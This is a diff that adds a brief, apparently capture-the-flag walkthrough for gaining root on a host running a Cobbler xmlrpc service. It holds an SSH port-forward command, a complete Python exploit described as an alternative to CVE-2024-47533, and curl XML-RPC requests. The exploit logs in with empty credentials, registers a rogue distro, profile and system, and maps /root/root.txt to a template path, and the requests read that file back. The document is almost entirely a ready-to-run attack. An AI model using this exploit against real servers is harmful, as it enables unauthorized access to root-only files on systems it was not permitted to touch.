@@ -1,0 +1,42 @@
+You just found in a port (maybe 25151) that is running this xmlrpc service.
+Steps to get root access:
+
+1. ssh -L 25151:127.0.0.1:25151 cobble@IP   (or with this too together: -L 8080:127.0.0.1:80)
+2. use this script which is an alternative of CVE-2024-47533:
+import xmlrpc.client
+
+KERNEL = "/boot/vmlinuz-6.1.0-37-amd64"
+INITRD = "/boot/initrd.img-6.1.0-37-amd64"
+TARGET = "/root/root.txt"
+NAME   = "pwnsys"
+DEST   = "/leak"
+
+srv = xmlrpc.client.ServerProxy("http://127.0.0.1:25151/RPC2", allow_none=True)
+tok = srv.login("", -1)
+
+did = srv.new_distro(tok)
+srv.modify_distro(did, "name", "pwn_distro", tok)
+srv.modify_distro(did, "arch", "x86_64", tok)
+srv.modify_distro(did, "breed", "redhat", tok)
+srv.modify_distro(did, "kernel", KERNEL, tok)
+srv.modify_distro(did, "initrd", INITRD, tok)
+srv.save_distro(did, tok)
+
+pid = srv.new_profile(tok)
+srv.modify_profile(pid, "name", "pwn_profile", tok)
+srv.modify_profile(pid, "distro", "pwn_distro", tok)
+srv.save_profile(pid, tok)
+
+sid = srv.new_system(tok)
+srv.modify_system(sid, "name", NAME, tok)
+srv.modify_system(sid, "profile", "pwn_profile", tok)
+srv.modify_system(sid, "template_files", {TARGET: DEST}, tok)
+srv.save_system(sid, tok)
+
+srv.sync(tok)
+
+
+3. # to locate the /root/root.xt under /leak
+curl -X POST -H "Content-Type: text/xml" -d '<?xml version="1.0"?><methodCall><methodName>get_system</methodName><params><param><value><string>pwnsys</string></value></param></params></methodCall>' http://
+127.0.0.1:25151
+curl -X POST http://127.0.0.1:25151 -H "Content-Type: text/xml" -d '<?xml version="1.0"?><methodCall><methodName>get_template_file_for_system</methodName><params><param><value><string>pwnsys</string></value></param><param><value><string>/leak</string></value></param></params></methodCall>'
